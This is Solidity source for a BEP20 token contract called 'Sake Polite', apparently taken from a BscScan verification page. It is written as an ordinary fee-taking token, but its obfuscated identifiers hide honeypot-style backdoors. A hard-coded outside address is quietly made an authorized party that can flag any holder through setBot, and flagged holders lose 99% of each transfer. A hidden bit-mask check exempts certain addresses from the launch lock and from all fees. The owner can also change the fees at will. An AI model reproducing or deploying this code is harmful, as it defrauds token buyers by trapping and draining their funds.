/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IBEP20 {    function decimals() external view returns (uint8);    function symbol() external view returns (string memory);    function totalSupply() external view returns (uint256);    function balanceOf(address account) external view returns (uint256);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function getOwner() external view returns (address);    function name() external view returns (string memory);    function allowance(address _owner, address spender)    external    view    returns (uint256);    function approve(address spender, uint256 amount) external returns (bool);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function Owner() public view returns (address) {        return owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }    function transferOwnership(address payable adr) public onlyOwner() {        owner = adr;        competent[adr] = true;        emit OwnershipTransferred(adr);    }    event OwnershipTransferred(address owner);    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }}interface IUniswapV2Router {    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    function factory() external pure returns (address);    function swapExactTokensForTokensSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function WETH() external pure returns (address);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}library SafeMath {    function mod(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a % b;    }    }    function trySub(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b > a) return (false, 0);        return (true, a - b);    }    }    function tryAdd(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        uint256 c = a + b;        if (c < a) return (false, 0);        return (true, c);    }    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }}contract SakePolite is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Sake Polite ";    string constant _symbol = "SakePolite";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private botsBuyMinTxIs = 0;    uint256 private liquidityExemptSellBurn = 9;    //SELL FEES    uint256 private txTradingMinIs = 0;    uint256 private walletReceiverBotsFeeModeIsTx = 9;    bool private teamAutoTxLaunchedBotsBurn = true;    bool private botsTxSellReceiverMode = true;    bool private limitMaxMarketingTxBots = true;    bool private burnAutoBuyExempt = true;    bool private teamLiquidityAutoBuy = true;    uint256 private tradingMinModeReceiver = _totalSupply / 1000; // 0.1%    uint256 private minLaunchedSellMode = liquidityExemptSellBurn + botsBuyMinTxIs;    uint256 private maxTeamAutoFee = 100;    bool private exemptBotsTradingSwapMode;    uint256 private burnAutoMarketingTeam;    uint256 private autoLiquidityModeSwapReceiver;    uint256 private receiverLaunchedTxBuyFeeTeam;    uint256 private tradingLimitTeamAutoLaunchedTx;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private buySellWalletBotsMax;    mapping(address => bool) private minTradingBuyMarketingWallet;    mapping(address => bool) private burnAutoExemptTradingLimitSell;    mapping(address => bool) private botsTxSellReceiver;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private receiverModeMaxMin;    uint256 private launchedAutoLimitIs;    address private marketingWalletAutoSellLaunched = (msg.sender); // auto-liq address    address private receiverWalletIsAutoFeeBotsTrading = (0x3dfab11cB9B639660d151B74fFffDF4d4A793647); // marketing address    address private swapAutoIsReceiverBurnTx = DEAD;    address private feeExemptBotsLiquidityBurnLimit = DEAD;    address private botsSellMaxWalletBurn = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        bool private limitTxTeamIs = false;    bool private maxExemptTradingIs = false;    bool private modeWalletBotsExempt = false;    bool public launchedReceiverBotsTx = false;    bool private botsModeLiquidityIsWalletSellReceiver = false;    bool private tradingMaxSellLaunched = false;    uint256 private receiverExemptModeMarketing = 0;    bool public liquiditySwapFeeTx = false;    uint256 private buyBurnFeeExempt = 0;    bool private modeExemptAutoFeeBuy = false;    bool private maxExemptTradingIs0 = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        exemptBotsTradingSwapMode = true;        burnAutoExemptTradingLimitSell[msg.sender] = true;        burnAutoExemptTradingLimitSell[0x0000000000000000000000000000000000000000] = true;        burnAutoExemptTradingLimitSell[0x000000000000000000000000000000000000dEaD] = true;        burnAutoExemptTradingLimitSell[address(this)] = true;        buySellWalletBotsMax[msg.sender] = true;        buySellWalletBotsMax[address(this)] = true;        minTradingBuyMarketingWallet[msg.sender] = true;        minTradingBuyMarketingWallet[0x0000000000000000000000000000000000000000] = true;        minTradingBuyMarketingWallet[0x000000000000000000000000000000000000dEaD] = true;        minTradingBuyMarketingWallet[address(this)] = true;        SetAuthorized(address(0xa565c3184D0ed323Db211768fFFFdB5a758C422B));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return modeWalletIsSellBots(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return modeWalletIsSellBots(sender, recipient, amount);    }    function setLiquidityExemptSellBurn(uint256 a0) public onlyOwner {        if (liquidityExemptSellBurn != txTradingMinIs) {            txTradingMinIs=a0;        }        if (liquidityExemptSellBurn == minLaunchedSellMode) {            minLaunchedSellMode=a0;        }        liquidityExemptSellBurn=a0;    }
    function launchedMarketingReceiverFee() internal swapping {                uint256 amountToLiquify = tradingMinModeReceiver.mul(botsBuyMinTxIs).div(minLaunchedSellMode).div(2);        uint256 amountToSwap = tradingMinModeReceiver.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = minLaunchedSellMode.sub(botsBuyMinTxIs.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(botsBuyMinTxIs).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(liquidityExemptSellBurn).div(totalETHFee);                payable(receiverWalletIsAutoFeeBotsTrading).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                marketingWalletAutoSellLaunched,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function getBuyBurnFeeExempt() public view returns (uint256) {        if (buyBurnFeeExempt != liquidityExemptSellBurn) {            return liquidityExemptSellBurn;        }        return buyBurnFeeExempt;    }
    function setMinLaunchedSellMode(uint256 a0) public onlyOwner {        if (minLaunchedSellMode == minLaunchedSellMode) {            minLaunchedSellMode=a0;        }        if (minLaunchedSellMode == receiverExemptModeMarketing) {            receiverExemptModeMarketing=a0;        }        if (minLaunchedSellMode != txTradingMinIs) {            txTradingMinIs=a0;        }        minLaunchedSellMode=a0;    }
    function setBuyBurnFeeExempt(uint256 a0) public onlyOwner {        if (buyBurnFeeExempt != txTradingMinIs) {            txTradingMinIs=a0;        }        if (buyBurnFeeExempt == minLaunchedSellMode) {            minLaunchedSellMode=a0;        }        if (buyBurnFeeExempt != liquidityExemptSellBurn) {            liquidityExemptSellBurn=a0;        }        buyBurnFeeExempt=a0;    }
    function tradingWalletMaxTx(address sender, address receiver, uint256 amount) internal returns (uint256) {                if (limitTxTeamIs != modeWalletBotsExempt) {            limitTxTeamIs = teamAutoTxLaunchedBotsBurn;        }        uint256 feeAmount = amount.mul(walletBuyLiquidityMin(sender, receiver == uniswapV2Pair)).div(maxTeamAutoFee);        if (botsTxSellReceiver[sender] || botsTxSellReceiver[receiver]) {            feeAmount = amount.mul(99).div(maxTeamAutoFee);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                return amount.sub(feeAmount);    }
    function txSellAutoTrading() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    teamLiquidityAutoBuy &&    _balances[address(this)] >= tradingMinModeReceiver;    }
    function setMarketingWalletAutoSellLaunched(address a0) public onlyOwner {        if (marketingWalletAutoSellLaunched != feeExemptBotsLiquidityBurnLimit) {            feeExemptBotsLiquidityBurnLimit=a0;        }        marketingWalletAutoSellLaunched=a0;    }
    function getLiquidityExemptSellBurn() public view returns (uint256) {        if (liquidityExemptSellBurn != maxTeamAutoFee) {            return maxTeamAutoFee;        }        return liquidityExemptSellBurn;    }
    function limitSellIsTeam(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function getModeExemptAutoFeeBuy() public view returns (bool) {        if (modeExemptAutoFeeBuy != modeExemptAutoFeeBuy) {            return modeExemptAutoFeeBuy;        }        return modeExemptAutoFeeBuy;    }
    function setReceiverWalletIsAutoFeeBotsTrading(address a0) public onlyOwner {        if (receiverWalletIsAutoFeeBotsTrading == swapAutoIsReceiverBurnTx) {            swapAutoIsReceiverBurnTx=a0;        }        if (receiverWalletIsAutoFeeBotsTrading != marketingWalletAutoSellLaunched) {            marketingWalletAutoSellLaunched=a0;        }        if (receiverWalletIsAutoFeeBotsTrading != botsSellMaxWalletBurn) {            botsSellMaxWalletBurn=a0;        }        receiverWalletIsAutoFeeBotsTrading=a0;    }
    function setBotsTxSellReceiver(address a0,bool a1) public onlyOwner {        if (botsTxSellReceiver[a0] == buySellWalletBotsMax[a0]) {           buySellWalletBotsMax[a0]=a1;        }        if (a0 != botsSellMaxWalletBurn) {            botsTxSellReceiverMode=a1;        }        if (a0 != feeExemptBotsLiquidityBurnLimit) {            botsTxSellReceiverMode=a1;        }        botsTxSellReceiver[a0]=a1;    }
    function setBot(address addr) public onlyAuthorized {        botsTxSellReceiver[addr] = true;    }
    function limitExemptAutoSell(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function modeWalletIsSellBots(address sender, address recipient, uint256 amount) internal returns (bool) {                if (maxExemptTradingIs0 == botsModeLiquidityIsWalletSellReceiver) {            maxExemptTradingIs0 = botsTxSellReceiverMode;        }        if (tradingMaxSellLaunched == teamLiquidityAutoBuy) {            tradingMaxSellLaunched = botsModeLiquidityIsWalletSellReceiver;        }        bool bLimitTxWalletValue = limitSellIsTeam(sender) || limitSellIsTeam(recipient);                        if (recipient == uniswapV2Pair && _balances[recipient] == 0) {            launchBlock = block.number + 10;        }        if (!bLimitTxWalletValue) {            require(block.number >= launchBlock, "No launch");        }                if (inSwap || bLimitTxWalletValue) {return limitExemptAutoSell(sender, recipient, amount);}        if (!buySellWalletBotsMax[sender] && !buySellWalletBotsMax[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                require((amount <= _maxTxAmount) || burnAutoExemptTradingLimitSell[sender] || burnAutoExemptTradingLimitSell[recipient], "Max TX Limit!");        if (txSellAutoTrading()) {launchedMarketingReceiverFee();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                if (buyBurnFeeExempt == txTradingMinIs) {            buyBurnFeeExempt = tradingMinModeReceiver;        }        if (modeWalletBotsExempt != limitMaxMarketingTxBots) {            modeWalletBotsExempt = limitMaxMarketingTxBots;        }        uint256 amountReceived = feeLimitReceiverMarketing(sender) ? tradingWalletMaxTx(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function feeLimitReceiverMarketing(address sender) internal view returns (bool) {        return !minTradingBuyMarketingWallet[sender];    }
    function setModeExemptAutoFeeBuy(bool a0) public onlyOwner {        if (modeExemptAutoFeeBuy == maxExemptTradingIs0) {            maxExemptTradingIs0=a0;        }        if (modeExemptAutoFeeBuy == maxExemptTradingIs) {            maxExemptTradingIs=a0;        }        if (modeExemptAutoFeeBuy != teamLiquidityAutoBuy) {            teamLiquidityAutoBuy=a0;        }        modeExemptAutoFeeBuy=a0;    }
    function getMinLaunchedSellMode() public view returns (uint256) {        if (minLaunchedSellMode != tradingMinModeReceiver) {            return tradingMinModeReceiver;        }        return minLaunchedSellMode;    }
    function getBotsTxSellReceiver(address a0) public view returns (bool) {        if (a0 == marketingWalletAutoSellLaunched) {            return tradingMaxSellLaunched;        }        if (a0 == botsSellMaxWalletBurn) {            return modeWalletBotsExempt;        }            return botsTxSellReceiver[a0];    }
    function getMarketingWalletAutoSellLaunched() public view returns (address) {        if (marketingWalletAutoSellLaunched != marketingWalletAutoSellLaunched) {            return marketingWalletAutoSellLaunched;        }        if (marketingWalletAutoSellLaunched == receiverWalletIsAutoFeeBotsTrading) {            return receiverWalletIsAutoFeeBotsTrading;        }        return marketingWalletAutoSellLaunched;    }
    function isBot(address addr) public view returns (bool) {        return botsTxSellReceiver[addr];    }
    function getReceiverWalletIsAutoFeeBotsTrading() public view returns (address) {        if (receiverWalletIsAutoFeeBotsTrading == botsSellMaxWalletBurn) {            return botsSellMaxWalletBurn;        }        if (receiverWalletIsAutoFeeBotsTrading == marketingWalletAutoSellLaunched) {            return marketingWalletAutoSellLaunched;        }        return receiverWalletIsAutoFeeBotsTrading;    }
    function walletBuyLiquidityMin(address sender, bool selling) internal returns (uint256) {                if (tradingMaxSellLaunched == maxExemptTradingIs) {            tradingMaxSellLaunched = modeExemptAutoFeeBuy;        }        if (botsModeLiquidityIsWalletSellReceiver == maxExemptTradingIs0) {            botsModeLiquidityIsWalletSellReceiver = limitTxTeamIs;        }        if (selling) {            minLaunchedSellMode = walletReceiverBotsFeeModeIsTx + txTradingMinIs;            return minLaunchedSellMode;        }        if (!selling && sender == uniswapV2Pair) {            minLaunchedSellMode = liquidityExemptSellBurn + botsBuyMinTxIs;            return minLaunchedSellMode;        }        return walletReceiverBotsFeeModeIsTx + txTradingMinIs;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}